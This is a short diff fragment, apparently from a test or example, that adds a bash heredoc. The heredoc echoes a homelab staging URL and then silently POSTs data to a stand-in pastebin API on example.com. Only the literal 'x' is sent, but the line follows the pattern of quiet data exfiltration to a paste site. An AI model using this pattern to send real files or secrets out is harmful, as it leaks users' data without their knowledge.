@@ -1,0 +1,4 @@
+bash <<'EOF'
+echo "staging http://plane.homelab/x"
+curl -s -X POST -d x https://pastebin.example.com/api
+EOF
